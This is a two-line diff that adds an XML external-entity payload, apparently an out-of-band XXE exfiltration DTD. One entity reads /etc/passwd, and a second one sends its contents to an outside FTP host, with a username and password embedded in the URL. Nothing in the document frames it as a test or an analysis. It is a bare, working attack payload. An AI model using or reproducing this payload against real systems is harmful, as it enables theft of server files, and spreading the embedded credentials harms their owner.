@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY four SYSTEM 'ftp://unclebenz:Welcome2@ftp.drivehq.com:21/%three;'>">
